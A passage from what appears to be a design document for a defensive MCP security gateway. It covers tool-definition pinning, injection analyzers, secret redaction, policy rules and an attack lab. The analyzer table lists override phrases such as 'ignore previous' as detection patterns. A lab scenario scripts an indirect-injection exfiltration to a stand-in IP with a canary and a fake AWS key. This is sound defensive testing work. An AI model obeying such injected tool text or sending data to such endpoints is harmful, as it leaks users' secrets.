  participant U as Upstream
  C->>B: tools/call {name, arguments} (id 9)
  opt enforce mode and pin check is stale
    B->>U: tools/list (id "bulwark-1", gateway-originated)
    U-->>B: definitions (consumed, not forwarded)
    B->>B: re-verify fingerprint of the called tool
  end
  B->>B: tool approved? (else deny)
  B->>B: secret scan on arguments → redact / finding
  B->>B: policy(tool, arguments, derived attributes, findings)
  alt deny
    B-->>C: error result with policy ID (id 9)
  else allow
    B->>U: tools/call, re-serialized, possibly redacted (id 9)
    U-->>B: result
    alt resultType "input_required" (MRTR, 2026-07-28)
      B->>B: analyze input requests (FR-034), audit
      B-->>C: input_required result (id 9)
      Note over C,B: client retries as a NEW tools/call<br/>(new id, inputResponses + requestState):<br/>full pipeline again, inputResponses<br/>secret-scanned and in the policy input (FR-035)
    else complete
      B->>B: secret scan on content, structuredContent → redact
      B-->>C: result (id 9)
    end
  end
  B->>B: audit(call, revision, decision, policy IDs, latency)
```
**MRTR retries (FR-035):** under 2026-07-28, a server asks for more input by returning `input_required` instead of sending its own request. The client's answers travel back to the server inside the retried `tools/call`, which makes them an exfiltration channel. Bulwark therefore gives the retry no shortcut: it is pin-checked, secret-scanned, and evaluated by policy like any other call, with `input.request.input_responses` and `input.request.is_retry` available to policies (§5.3). Under 2025-11-25 the same requests arrive as server-initiated `sampling/createMessage`, `elicitation/create`, or `roots/list`; v0.1 passes those through and audits them (decision 6).
**Verify before call (FR-030), and what it does and does not buy:** a changed definition can only reach the model through a `tools/list` response, and Bulwark already checks every one of those (FR-021). So the poisoning half of a rug pull is caught without any re-check. The re-check adds one thing: it notices that the server's **implementation has changed** (a new definition) even when the client never re-lists, and blocks calls to the changed tool until it is re-approved. That is a useful signal of a behavioral change, but only a signal. A malicious server defeats it by always answering `tools/list` with the pinned definition, which is exactly the behavioral rug pull in T-06 (AR-4). The re-check therefore runs when Bulwark's view is stale (after a change notification, when `ttlMs` expires, or after `pin_recheck_max_age`, default 300 s), not before every call. Re-checking before every call is opt-in, because it doubles upstream traffic and can disturb stateful servers for little extra protection.

**Attack suite run (CI)**
```mermaid
sequenceDiagram
  participant T as Suite test
  participant R as Replay client
  participant B as Bulwark (or none)
  participant L as bulwark-lab Lxx
  participant O as Observation log
  T->>T: fresh temp dir, BULWARK_LAB=1, BULWARK_LAB_OBS=path
  T->>R: start with condition (none / bulwark-warn / bulwark-enforce) and revision
  R->>B: replay script (server/discover or initialize, tools/list, tools/call, MRTR retries…)
  B->>L: (forwarded or blocked)
  L->>O: record calls and "exfiltrated" canaries
  R-->>T: transcript (messages received)
  T->>O: read observations
  T->>T: compute observables, assert expectations, emit results JSON
```

**Decided in this draft** (§14.1): one process per server (no aggregation in v0.1), file-based sink, verify-before-call by default, two supported revisions without translation, MRTR retries as full calls. Deny formats are decided in §6.6: a hidden tool gets a protocol error, a policy deny gets a tool result with `isError: true`.

### 4.5 Model-visible channels
Every place where server-supplied text can reach the model or the user, and what v0.1 does about it. This table bounds the claim in §1.1: a channel not marked **pinned** or **blocked** is a residual risk (§7.6).

| # | Channel | Revision | Reaches | v0.1 handling | Requirement | Residual |
|---|---|---|---|---|---|---|
| CH-1 | Tool definitions (whole object) | both | Model | **Pinned, analyzed, hidden** in `enforce` until approved | FR-021, FR-022, FR-030 | AR-5 |
| CH-2 | Server `instructions` and server info | both (`server/discover` or `initialize`) | Model (clients may add instructions to the model's context) | **Pinned, analyzed, stripped** in `enforce` until approved | FR-033 | AR-5 |
| CH-3 | Tool results: `content`, `structuredContent` | both | Model | Secrets redacted; injection **not** detected in v0.1 | FR-025 | AR-7, AR-9 |
| CH-4 | Prompts: `prompts/list` metadata, `prompts/get` messages | both | Model (when the user picks a prompt) | Analyzed and audited; not pinned or blocked | FR-034 | AR-8 |
| CH-5 | Resources: list and template metadata, `resources/read` contents | both | Model | Metadata analyzed; contents secret-scanned; audited | FR-025, FR-034 | AR-8, AR-9 |
| CH-6 | MRTR input requests (elicitation text, sampling prompts) | 2026-07-28 | User and model | Analyzed and audited; the answers are policy-checked on retry | FR-034, FR-035 | AR-8 |
| CH-7 | Server-initiated sampling, elicitation, roots | 2025-11-25 | User and model | Passed through and audited | FR-026 | T-05 |
| CH-8 | Upstream error messages and `data` | both | Model (often shown as tool output) | Secret-scanned and audited | FR-025 | AR-9 |
| CH-9 | Logging and progress notifications | both (logging deprecated in 2026-07-28) | Usually user only; treated as possibly model-visible, because client behavior varies | Rate-limited and audited | NFR-013 | AR-9 |

## 5. Detailed design ✅

Scope: v0.1 only. Later features (taint, approval broker, classifier) keep short placeholders in §5.10 so their interfaces are not designed twice.

### 5.1 Message pipeline
Implemented by `internal/jsonrpc` (framing, strict parsing, lossless re-serialization), `internal/mcprev` (§5.2), `internal/pipeline` (the interceptor chain), and `internal/proxy` (pipes, request tracking, upstream lifecycle). Every message, in either direction, passes the same stages. A failure at any stage produces the error response in §6.6 and an audit record. It never produces a silent pass-through (NFR-005, T-15).

```mermaid
flowchart LR
  R["read line<br/>(≤ max_message_bytes)"] --> P["strict parse<br/>(FR-028)"]
  P --> K["classify<br/>request / response / notification,<br/>direction, method"]
  K --> V["revision detect<br/>(§5.2, FR-036)"]
  V --> I["interceptor chain<br/>for (direction, method)"]
  I --> S["re-serialize<br/>(lossless)"]
  S --> W["write line"]
  I --> A[("audit")]
```

**Concurrency:** two reader goroutines (client→server, server→client) and one writer per pipe, guarded by a mutex so that gateway-originated messages and forwarded messages never interleave within a line. The outstanding-request table is bounded (`max_outstanding_requests`, NFR-013). An interceptor panic is recovered and becomes a block decision.

**Interceptor contract (Go, illustrative):**
```go
type Verdict int // Forward, Modify, Block

type Interceptor interface {
	Name() string                    // appears in audit records as the control ID
	Match(m *Message) bool           // direction + method (+ revision) filter
	Handle(ctx context.Context, m *Message, s *Session) (Verdict, *Message, []Finding, error)
}
```

**Interceptor order (v0.1):**
| Direction | Method / message | Interceptors, in order | Requirements |
|---|---|---|---|
| client → server | any request | revision check → request-ID tracking → limits | FR-031, FR-036, NFR-013 |
| client → server | `tools/call` | MRTR checks (§5.7) → pin check (verify-before-call when stale) → secret scan of `arguments` and `inputResponses` (deny per config) → policy | FR-021, FR-025, FR-030, FR-035, FR-023, FR-024 |
| client → server | `prompts/get`, `resources/read` retries | MRTR checks (§5.7) → secret scan of `inputResponses` | FR-025, FR-035 |
| server → client | `server/discover` / `initialize` result | metadata fingerprint and pin → analyzers → strip in `enforce` | FR-033 |
| server → client | `tools/list` result | fingerprint and pin → analyzers → mode filter (hide) | FR-021, FR-022 |
| server → client | `tools/call` result | `input_required` handling (analyzers on `inputRequests`, record correlation) **or** secret scan of `content`, `structuredContent` | FR-025, FR-034, FR-035 |
| server → client | `prompts/*`, `resources/*` results | analyzers on metadata and prompt messages; secret scan of text contents; audit only | FR-025, FR-034 |
| server → client | error responses | secret scan of `message` and `data` | FR-025 |
| server → client | notifications | rate limit; `notifications/tools/list_changed` marks the tool view stale | FR-030, NFR-013 |
| server → client | **request** (2025-11-25 only) | analyzers on text, audit, forward | T-05, decision 6 |
| server → client | **request** under 2026-07-28 | protocol violation: block (`enforce`) or audit (`learn`, `warn`) | FR-036 |

**Gateway-originated requests** (its own `server/discover` and re-check `tools/list`) use string IDs `bulwark-<random 128-bit hex>-<counter>`. The random prefix is chosen per process, so a client cannot predict or collide with it (FR-031, T-04). Their responses are consumed and never forwarded.

**Upstream process lifecycle:**
- Started with `exec` directly (never through a shell), the client's environment passed through unchanged, and stderr passed through byte-for-byte.
- If the client closes stdin, Bulwark closes the upstream's stdin, waits 5 s, then sends SIGTERM, then SIGKILL after another 5 s.
- If the upstream exits, Bulwark flushes the audit log and exits with the upstream's exit code. Exit code 70 means Bulwark itself failed.

### 5.2 Protocol revision handling (`internal/mcprev`)
| Situation | Revision assigned | Notes |
|---|---|---|
| Request carries `_meta["io.modelcontextprotocol/protocolVersion"]` | That value | 2026-07-28 rule; checked against the supported set |
| `initialize` request | `params.protocolVersion`; the connection is marked **legacy-negotiated** with the version in the result | 2025-11-25 rule |
| Request without the `_meta` key on a legacy-negotiated connection | The negotiated version | |
| Request without the key on a connection never negotiated | **unknown** | `enforce`: rejected with `UnsupportedProtocolVersionError` (-32022) listing the supported revisions; `learn`/`warn`: forwarded with a `revision.unknown` finding |
| Supported revisions | `2026-07-28`, `2025-11-25` | Anything else is unsupported (FR-036) |
| A modern request on a legacy-negotiated connection, or the reverse | Per message, as above, plus a `revision.mixed` finding | T-17 |

Both revisions are mapped onto one internal model, so every interceptor is written once:
| Internal event | 2026-07-28 source | 2025-11-25 source |
|---|---|---|
| `ServerMetadata{instructions, serverInfo, capabilities}` | `server/discover` result; `serverInfo` from result `_meta` | `initialize` result |
| `ToolViewStale` | `notifications/tools/list_changed` on a `subscriptions/listen` stream | `notifications/tools/list_changed` |
| `InputRequired{inputRequests, requestState}` | `tools/call` result with `resultType: "input_required"` | — |
| `ServerRequest{method, params}` | — (violation) | `sampling/createMessage`, `elicitation/create`, `roots/list` |

**Bulwark's own `server/discover`:** under 2026-07-28, if the client's first modern request is not `server/discover`, Bulwark sends its own first (reserved ID) and pins and analyzes the result **before** forwarding the client's request. This adds one round trip, once per process, and means server metadata is always checked before any tool use.

### 5.3 Server identity, fingerprints, and the pin store (`internal/registry`)
**Server identity** comes only from Bulwark's side, never from the server (its `serverInfo` is self-reported and untrusted):
- `server_id`: the name the operator gives with `--server-id`. It is required in `enforce` mode. In `learn` and `warn` modes the default is `auto-<first 12 hex digits of command_digest>`, printed at startup, so pins and audit files are still keyed consistently.
- `command_digest`: SHA-256 over the canonical form of `{argv, resolved executable path, SHA-256 of the executable file}`.

This identifies *what was asked to launch*, not every file the server loads. A command like `npx -y some-package` fetches whatever version is current, so `bulwark wrap` warns (`identity.unpinned_package`) when an `npx`/`uvx` argument has no exact version, or a `docker run` image has no `@sha256:` digest. A changed `command_digest` is treated as a changed server: in `enforce` mode all of its tools and metadata are hidden or stripped until re-approved with `bulwark tools approve`.

**Fingerprints** are `sha256:` over a canonical JSON form of the object, minus an explicit exclude list that is empty by default. The canonical form follows RFC 8785 (JCS) for key ordering and string escaping. It deliberately **deviates for numbers**: it keeps the exact decimal literal instead of JCS's IEEE-754 form. Strict JCS would map two different large integers to the same double, letting a server change a number without changing the fingerprint, and would conflict with lossless forwarding (FR-028). The deviation is documented and tested.

**Pin store:** one JSON file per server, `<state_dir>/pins/<server_id>.json`. Writes are atomic (temp file + rename) under an advisory file lock, because several Bulwark processes may wrap the same server (one per client window). Format in §6.4.

**Modes:**
| Mode | New or changed tool | Changed or unapproved metadata | High-severity finding |
|---|---|---|---|
| `learn` | Pinned automatically; audited | Pinned automatically; audited | Audited |
| `warn` | Forwarded; `pin.unapproved` / `pin.changed` finding | Forwarded; finding | Forwarded; finding |
| `enforce` | **Hidden** from `tools/list`; calls get "Unknown tool" | `instructions` and free-text fields **stripped** | Tool **hidden** / metadata **stripped** until approved |

**Re-check schedule (FR-030):** the tool view becomes stale after a `ToolViewStale` event, or when its age exceeds `min(ttlMs, pin_recheck_max_age)`. A `ttlMs` of 0 is treated as no hint. In every case, the gateway re-checks **at most once per `pin_recheck_min_age`** (default 30 s), so neither a tiny `ttlMs` nor a stream of change notifications can force a re-check before every call. The gateway's own `tools/list` follows every `nextCursor` page.

**Diffs** (`bulwark tools diff`) show a path-based structural diff of the JSON plus a line diff for long strings. All untrusted text goes through `termsafe` (FR-029).

### 5.4 Analyzers (`internal/analyzers`)
Each analyzer receives the text fields of one channel (§4.5) as `(json_pointer, string)` pairs and returns findings:

```json
{"analyzer": "text.imperative", "rule": "ignore-previous", "severity": "high",
 "channel": "CH-1", "location": "/tools/3/description", "excerpt": "…<IMPORTANT> ignore previous…"}
```
Excerpts are at most 120 characters, secret-redacted, and stored as escaped text.

**v0.1 analyzers** (FR-022 minimum set):
| Analyzer | Detects | Default severity | Method |
|---|---|---|---|
| `unicode.hidden` | Unicode Tags block (U+E0000–U+E007F), zero-width characters, bidi controls, and other format/control characters in names and descriptions | high (Tags, bidi); medium (zero-width) | Code-point classes; no heuristics |
| `text.imperative` | Model-directed instructions: "ignore previous", "do not tell the user", `<IMPORTANT>`-style blocks, role-play preambles, "before using this tool, read …" | high / medium per rule | Rule file of RE2 patterns over raw **and** normalized text (NFKC, case fold, zero-width removed) |
| `text.cross_reference` | Text in one tool's definition that names another tool of the same server, or tells the agent how to call it (shadowing) | high when combined with an imperative; low alone | Compares against the current tool names in the registry |
| `schema.side_channel` | Free-text parameters unrelated to the stated purpose that solicit context (`context`, `notes`, `metadata`, `debug_info`), especially with descriptions asking for "conversation", "previous messages", keys, or file contents | high / medium | Parameter-name and description rules |

The rules are data: a versioned YAML file embedded in the binary (`go:embed`), using Go's RE2 engine (linear time, no ReDoS). The seed notes' `text.sensitive_ref`, `annotation.mismatch`, and `size.anomaly` analyzers move to v0.2.

**Detection corpora (FR-006):**
- **Poisoned:** a subset of MCPTox's benchmark materials, licensed CC BY 4.0 (github.com/zhiqiangwang4/MCPTox-Benchmark), stored with a NOTICE file giving attribution, plus the lab's own scenario payloads.
- **Benign:** tool definitions extracted from the official MCP reference servers (github.com/modelcontextprotocol/servers; MIT, moving to Apache-2.0), with attribution.

Each corpus is split once, by a fixed seed, into a **tuning** half (used while writing rules) and a **held-out** half. CI reports detection and false-positive rates per analyzer **on the held-out half**, so the rules can't simply be fitted to the test data. IDEA.md sets the targets (≥ 90 % detection, ≤ 2 % false positives).

### 5.5 Secret detection and redaction (`internal/redact`)
- **Rules (v0.1, patterns only):** AWS access key IDs, GitHub tokens (`ghp_`, `gho_`, `ghs_`, `github_pat_`), Slack tokens (`xox?-`), Google API keys, Stripe live keys, PEM private-key blocks, and JWTs (medium). All are RE2. Each rule has positive and negative unit tests. The suite's plain canary must match none of them (§10.3).
- **Where:** `tools/call` arguments, and `inputResponses` on retries of `tools/call`, `prompts/get`, and `resources/read` (client → server); results (`content` text, `structuredContent` strings, error `message`/`data`, resource text contents) (server → client). Binary and base64 blobs are not scanned in v0.1 (AR-9).
- **Actions (configurable, §6.3):**
  - Requests: default **`deny`**, enforced by this interceptor itself, before and independent of policy (control `secrets:<rule>`). Silently changing an argument would alter what the tool does. `redact` and `audit` are the other options.
  - Results: default **`redact`**, replacing the match with a visible marker `[REDACTED:<rule>]`. The model can see that something was removed; it is never silent.

### 5.6 Policy engine (`internal/policy`)
**Policy model: allow by pin, restrict with `deny` (decision 35).** Three layers, in this order:

| Layer | What it does | Where it lives | Control ID when it blocks |
|---|---|---|---|
| 1. Gateway checks | Secrets in request arguments and `inputResponses` (`secrets.requests: deny`), and MRTR `unsolicited_response`/`unmatched_retry` | Interceptors (§5.5, §5.7); they run **before** policy and do not depend on any policy file | `secrets:<rule>`, `mrtr:<check>` |
| 2. Operator `deny` rules | Restrictions: path prefixes, host allowlists, recipient domains, anything else | The operator's Rego files | `policy:<rule id>` |
| 3. Allow + default-deny | `allow` grants. The embedded **baseline allow** (`baseline-approved-tool`, on by default) grants every **approved** tool. With no `allow`, the call is denied | Baseline bundle + operator Rego | `policy:default-deny` |

The combiner is unchanged: any `deny` → deny; else any `ask` → ask (in v0.1, deny with an `approval_required` record); else any `allow` → allow; else deny. Because operators **restrict with `deny` rules**, a restriction always wins over the baseline allow, and the rule that blocked is named in the audit record and the suite results (FR-004). With `policy.baseline_allow: false`, nothing is allowed unless an operator `allow` rule grants it, and blocks are recorded as `policy:default-deny`.

**Capabilities:** OPA's default capabilities minus **every built-in OPA marks `nondeterministic`**. The list is derived mechanically from the pinned OPA version's capabilities file, not maintained by hand. At OPA `main` on 2026-11-26 that is 11 built-ins: `http.send`, `net.lookup_ip_addr`, `opa.runtime`, `io.jwt.decode_verify`, `io.jwt.encode_sign`, `io.jwt.encode_sign_raw`, `json.match_schema`, `json.verify_schema`, `rand.intn`, `time.now_ns`, `uuid.rfc4122`. This removes network access (T-19), environment access, and nondeterminism (NFR-008) in one rule. A policy that uses one fails to load.

**Evaluation:** queries are prepared at startup. Each evaluation has a 50 ms timeout, and a timeout or error means deny (NFR-005). There is no hot reload in v0.1: policies change when the client restarts the server process.

**Schema:** the decision input is published as a JSON Schema (`schemas/policy-input.v1.json`) and validated in tests. Every `location` in Bulwark, whether in findings, audit records, or policy input, is a **JSON Pointer** (RFC 6901) into the message's `params` or `result`.

Decision input (v0.1):

```json
{
  "server": {"id": "web", "command_digest": "sha256:…"},
  "tool": {"name": "http_post", "pin_status": "approved", "arg_roles": {"url": "egress_url"}, "annotations": {"readOnlyHint": false}},
  "arguments": {"url": "https://api.example.com/v1/upload", "body": "…"},
  "request": {"revision": "2026-07-28", "is_retry": false, "input_responses": null},
  "derived": {"egress_url": {"scheme": "https", "host": "api.example.com"}, "fs_path": null, "args_bytes": 812},
  "findings": [{"analyzer": "text.imperative", "severity": "medium", "location": "/arguments/body"}],
  "mode": "enforce"
}
```

`server.id` is the name the operator gave the wrapped server, and `command_digest` identifies what was launched. Both come from Bulwark, not from the server. `tool.arg_roles` comes from configuration and is pinned with the tool.

Example operator policy. Restrictions are `deny` rules keyed on the **server and the declared argument role**. A third rule makes sure a tool approved later can't slip past them. If a declared role's derived value is missing (for example, the URL didn't parse), the rule **denies**, failing closed. The policy tests in §10.1 check this case for every restriction.

```rego
package bulwark.authz

# Rego v1 syntax (the default in OPA 1.x, so no `import rego.v1` is needed).

# Restrictions are keyed on the server and the declared argument role, not on
# tool names (the server picks those). Each check is a named helper rule used as
# `not helper`: if the derived value is missing (unparseable URL, relative path),
# the helper is undefined, `not` is true, and the call is denied. (Writing
# `not input.derived.egress_url.host in {...}` inline does NOT fail closed: with a
# missing host the whole expression is undefined and the rule never fires.)

# Arguments declared as fs_path on the "fs" server must stay inside the workspace.
deny contains "fs-workspace-only" if {
	input.server.id == "fs"
	"fs_path" in {r | some r in input.tool.arg_roles}
	not fs_path_ok
}

fs_path_ok if startswith(input.derived.fs_path, "/workspace/")

# Arguments declared as egress_url on the "web" server must target an approved host.
deny contains "http-allowlist" if {
	input.server.id == "web"
	"egress_url" in {r | some r in input.tool.arg_roles}
	not egress_host_ok
}

egress_host_ok if input.derived.egress_url.host in {"api.example.com"}

# On these servers, a tool runs only after its arguments were reviewed: it declares
# roles, or the operator listed it as having no sensitive arguments. A tool approved
# later without either is denied, so it can't slip past the two rules above.
deny contains "roles-reviewed" if {
	input.server.id in {"fs", "web"}
	count(input.tool.arg_roles) == 0
	not input.tool.name in {"list_allowed_directories", "fetch_note"}
}
```

Policy tests (`bulwark policy test`, §10.1) include: each restriction blocks **with the baseline allow enabled**; the right rule ID is reported; a missing derived value denies; and a policy using a removed built-in fails to load.

**Derived attributes** are computed only for declared roles:
| Role | Derived value | Notes |
|---|---|---|
| `fs_path` | `path.Clean` of the absolute path; relative paths are rejected | Lexical only (AR-10) |
| `egress_url` | Scheme, lowercased host (IDNA to ASCII), port | Unparseable URLs get `null`, so deny rules on that role fire (fail closed) |
| `recipient` | Lowercased address and domain | For email-like tools |

### 5.7 Multi Round-Trip Requests (FR-035)
MRTR applies to all three methods that may return `input_required` under 2026-07-28: `tools/call`, `prompts/get`, and `resources/read`. Bulwark handles all three the same way.

- **Recording:** when a result has `resultType: "input_required"`, Bulwark records `{server_id, method, target (tool name, prompt name, or resource URI), requestState or empty, inputRequests keys, time}` in a bounded table (64 entries, 10-minute TTL). It runs the analyzers on the request text (elicitation messages, sampling prompts) and forwards the result unchanged.
- **Retry detection:** a later request with the same method that carries `inputResponses` or `requestState` is a **retry**.
- **Matching:** the retry is matched on server, method, target, and the exact `requestState`. When the original result had **no** `requestState`, the match is the most recent entry for that server, method, and target whose requested keys include every key in `inputResponses`. If two such entries exist with different key sets, the retry is ambiguous and treated as unmatched.
- **Checks (MRTR interceptor, before and independent of policy):**
  - keys in `inputResponses` that were never requested → `mrtr:unsolicited_response`
  - a retry with no match → `mrtr:unmatched_retry`
  - secrets in `inputResponses` → `secrets:<rule>` (§5.5)

  In `enforce` mode each of these blocks the retry. `requestState` is passed through byte-for-byte and never parsed.
- **`tools/call` retries** then go through the rest of the `tools/call` chain (pin check, policy), with `request.is_retry = true`. **`prompts/get` and `resources/read` retries** get the MRTR checks above. Policy evaluation for those methods is v0.2 (AR-8).
- Scenario L-08 attributes the `secrets:<rule>` control on a `tools/call` retry. A unit and integration test covers the same checks on `resources/read`.

### 5.8 Audit log (`internal/audit`)
- **Files:** `<state_dir>/audit/<server_id>/<UTC start time>-<pid>.jsonl`, one hash chain per file (one per process).
- **Chain:** each record's `hash` = SHA-256(`prev_hash` ‖ canonical record without `hash`). The first record (`event: "start"`) uses a fixed genesis value and records the Bulwark version, config digest, policy bundle digest, pin store digest, mode, and `command_digest`.
- **Durability:** each record is written and flushed as one line. `fsync` runs every second and on exit. **If the audit log can't be written in `enforce` mode, every call is denied**, so nothing goes unrecorded.
- **Privacy defaults:** arguments are stored as an HMAC-SHA-256 value (`args_mac`) under a random per-install key (`<state_dir>/audit.key`, `0600`) plus their size; raw argument values are not logged. A plain SHA-256 digest of a short path or ID could be reversed by guessing; the keyed form can't be without the key, which stays out of exported logs. Equal arguments still produce equal values, so investigators can correlate calls. Findings carry only redacted, truncated excerpts (T-10).
- **`audit verify`** recomputes every chain and reports the first broken record. It also states the limit in AR-6: a truncated tail or a wholly rewritten file cannot be detected without an external anchor (v0.2).

### 5.9 Attack suite internals
- **Replay client: scripted raw JSON-RPC, not the SDK.** A replay script lists the exact messages to send and what to wait for. This gives exact control over the revision on the wire (including the 2025-11-25 `initialize` path) and lets scripts send deliberately odd messages, such as duplicate keys or mixed revisions, to test FR-028 and FR-036. The official Go SDK is used **only inside the lab servers**. A v1.7.0 SDK server answers a legacy `initialize` at the client's version when it is supported and older than 2026-07-28 (`negotiatedVersion` in `mcp/shared.go` at tag v1.7.0), so no per-connection pin is needed.
- **Lab binary:** `lab/cmd/bulwark-lab <scenario-server>` runs one lab server. It refuses to start without `BULWARK_LAB=1` and prints the `LAB ONLY` banner (FR-008). `tools/ci-summary` renders `results.json` (§6.8) into the job summary.
- **Observation log:** lab servers append `{"scenario", "event": "call"|"exfil", "tool", "canary"}` lines to `$BULWARK_LAB_OBS`. Observables (§1.4) are computed from this log plus the replay transcript.
- **Conditions and attribution:** for each scenario × condition × revision × control, the suite starts a fresh temp directory and process tree, then asserts the observables and the control IDs found in the audit log (FR-004). Results go to `results.json` (§6.8).
- **Determinism (NFR-008):** no wall-clock dependence (an injected clock in Bulwark and the lab), a fixed random seed for the ID prefix in test mode, and no parallel writes to one observation log.

### 5.10 Deferred components (interfaces only)
| Component | Version | Hook in v0.1 |
|---|---|---|
| Taint tracker | v0.2 | `request` object reserves `session.taint`; interceptors run per session |
| Approval broker | v0.2 | `ask` decisions already produce `approval_required` records with the policy ID. Under 2026-07-28, the broker could answer the client with its own `input_required` (an elicitation), since a gateway acts as a server to the client. Open question for v0.2 |
| Injection classifier | v0.3 | Analyzer interface accepts a scorer; findings carry `severity` from a threshold |
| OTel / OCSF export | v0.3 | Audit records map onto OCSF **API Activity (class_uid 6003)**, category Application Activity (6), confirmed in the OCSF schema repository |

---

## 6. Interfaces and data model ✅

### 6.1 CLI (v0.1)
```
bulwark wrap    [--server-id ID] [--mode learn|warn|enforce] [--config FILE] [--state-dir DIR] -- <command> [args...]
bulwark tools   list    --server-id ID [--json]
bulwark tools   diff    --server-id ID [TOOL]
bulwark tools   approve --server-id ID (TOOL... | --all | --metadata)
bulwark tools   reject  --server-id ID TOOL...
bulwark policy  test    [--policy-dir DIR]... [--input FILE]
bulwark audit   verify  [--server-id ID | FILE...]
bulwark audit   tail    [--server-id ID] [--event TYPE] [--follow] [--json]
bulwark version
```
| Exit code | Meaning |
|---|---|
| 0 | Success |
| 1 | Error (bad configuration, unreadable files) |
| 2 | Usage error |
| 3 | Check failed (`audit verify` found a broken chain; `policy test` failed) |
| upstream's code | `wrap`: the upstream's exit code; **70** if Bulwark itself failed. Because an upstream may also exit with 70, a Bulwark failure is also reported as a `bulwark:`-prefixed stderr line and a `stop` audit record with `reason: internal_error` |

Defaults: `--mode warn` (safe to try; nothing is blocked); `--state-dir` = `$XDG_STATE_HOME/bulwark` (`~/.local/state/bulwark`); config from `--config`, then `$BULWARK_CONFIG`, then `$XDG_CONFIG_HOME/bulwark/config.yaml`.

### 6.2 MCP client configuration
Adoption is a one-line change in the client's server entry (G1):
```json
{
  "mcpServers": {
    "fs": {
      "command": "bulwark",
      "args": ["wrap", "--server-id", "fs", "--mode", "enforce", "--",
               "npx", "-y", "@modelcontextprotocol/server-filesystem@<exact-version>", "/workspace"]
    }
  }
}
```

### 6.3 Configuration file (`version: 1`)
YAML, validated against an embedded JSON Schema. Unknown keys are errors. An invalid config in `enforce` mode stops `wrap` from starting (fail closed).
```yaml
version: 1
servers:                       # keyed by --server-id
  fs:
    mode: enforce
    pin_recheck_max_age: 300s
    pin_recheck_min_age: 30s
    arg_roles:                 # pinned with each tool; changes are audited
      read_file:  { path: fs_path }
      write_file: { path: fs_path }
  web:
    mode: warn
    arg_roles:
      http_post: { url: egress_url }
policy:
  baseline_allow: true         # allow approved tools; restrictions are deny rules (§5.6)
  dirs: ["~/.config/bulwark/policies"]
  eval_timeout: 50ms
secrets:
  requests: deny               # deny | redact | audit (enforced by the gateway, not by policy)
  results: redact              # redact | audit
limits:
  max_message_bytes: 4194304
  max_depth: 64
  max_outstanding_requests: 256
  notifications_per_second: 20
```

### 6.4 Pin store (`pins/<server_id>.json`, `schema_version: 1`)
```json
{
  "schema_version": 1,
  "server_id": "fs",
  "command_digest": "sha256:…",
  "metadata": {"fingerprint": "sha256:…", "snapshot": {"instructions": "…"}, "approved_at": "2026-12-01T10:00:00Z"},
  "tools": {
    "read_file": {
      "fingerprint": "sha256:…",
      "snapshot": {"name": "read_file", "description": "…", "inputSchema": {}},
      "exclude_fields": [],
      "arg_roles": {"path": "fs_path"},
      "status": "approved",
      "approved_at": "2026-12-01T10:00:00Z",
      "findings_at_approval": []
    }
  }
}
```
`status` is `approved`, `rejected`, or `pending`. Approval happens only through the CLI, never through MCP.

### 6.5 Audit record
```json
{
  "v": 1,
  "seq": 1042,
  "ts": "2026-12-01T10:03:22.118Z",
  "event": "call_decision",
  "server_id": "web",
  "revision": "2026-07-28",
  "direction": "c2s",
  "method": "tools/call",
  "tool": "http_post",
  "jsonrpc_id": 9,
  "args_mac": "hmac-sha256:…",
  "args_bytes": 812,
  "decision": "deny",
  "controls": ["secrets:aws-access-key"],
  "findings": [{"analyzer": "secrets", "rule": "aws-access-key", "severity": "high", "location": "/arguments/body"}],
  "latency_us": {"gateway": 410, "upstream": null},
  "prev_hash": "sha256:…",
  "hash": "sha256:…"
}
```
**Event types:** `start`, `stop`, `metadata`, `tools_list`, `pin_event`, `call_decision`, `mrtr_input_required`, `server_request`, `protocol_violation`, `limit_exceeded`, `rate_limited`, `audit_error`. The `controls` field is what the suite reads for attribution (FR-004).

### 6.6 Error responses Bulwark generates
| Situation | Response to the sender | Why this form |
|---|---|---|
| Call to a hidden or unapproved tool | JSON-RPC error `-32602`, message `Unknown tool: <name>` | The same answer a server gives for a tool it doesn't list (MCP 2026-07-28 tools spec; Go SDK uses the same code), so hiding doesn't leak the tool's existence |
| Policy deny or `approval_required` | **Tool result** with `isError: true` (and `resultType: "complete"` under 2026-07-28); text: `Blocked by MCP Bulwark (policy <id>). The call was not sent to the server.` | The spec says clients SHOULD show tool execution errors to the model, so it can adjust instead of retrying blindly. The text contains only operator-defined IDs, never request data |
| Unknown or unsupported revision (`enforce`) | JSON-RPC error `-32022` `UnsupportedProtocolVersionError` with the supported list | Code reserved by the 2026-07-28 specification |
| Duplicate keys, invalid UTF-8, lone surrogates | JSON-RPC error `-32600` (Invalid Request) | Valid-JSON-but-rejected messages; `-32700` only for unparseable lines |
| Size, depth, or outstanding-request limit | JSON-RPC error `-32010` (implementation-defined range `-32000…-32019`) | Distinguishable in logs from spec errors |
| Server-originated request under 2026-07-28 (`enforce`) | Not forwarded; the server gets `-32601` (Method not found) | The spec forbids servers writing requests on stdio |

The deny-format question (Q1 in v0.9) is closed by this table. A test against the official Go SDK client checks that a policy deny arrives as a normal tool result with `IsError` set, and a hidden tool as a protocol error.

### 6.7 Scenario manifest (`lab/scenarios/L-04.yaml`, abbreviated)
```yaml
id: L-04
title: Indirect injection leading to exfiltration
technique: {owasp_agentic: [ASI01], owasp_llm: [LLM01, LLM02], atlas: [AML.T0051.001, AML.T0086]}
server: l04-web-notes              # bulwark-lab subcommand
revisions: [2026-07-28]
canaries: {plain: canary-plain-7f3a, secret: AKIAEXAMPLE7F3AEXAMPLE}
script:
  - send: {method: tools/list}
  - send: {method: tools/call, params: {name: fetch_note, arguments: {id: "n1"}}}
  - send: {method: tools/call, params: {name: http_post, arguments: {url: "https://203.0.113.7/collect", body: "{{canaries.plain}}"}}}
runs:                               # one run per control (FR-004)
  - control: policy:http-allowlist
    config: {arg_roles: {http_post: {url: egress_url}}}
    expect:
      none:    {canary_exfiltrated: true}
      warn:    {canary_exfiltrated: true, controls_fired: [policy:http-allowlist]}
      enforce: {canary_exfiltrated: false, controls_fired: [policy:http-allowlist]}
  - control: secrets:aws-access-key     # blocked by the secrets interceptor, before policy
    script_override: {3: {arguments: {url: "https://api.example.com/upload", body: "{{canaries.secret}}"}}}
    expect:
      none:    {canary_exfiltrated: true}
      warn:    {canary_exfiltrated: true, controls_fired: [secrets:aws-access-key]}
      enforce: {canary_exfiltrated: false, controls_fired: [secrets:aws-access-key]}
```

### 6.8 Suite results (`results.json`, rendered by `tools/ci-summary`)
```json
{"run": {"commit": "…", "revisions": ["2026-07-28", "2025-11-25"]},
 "results": [{"scenario": "L-04", "control": "policy:http-allowlist", "condition": "enforce", "revision": "2026-07-28",
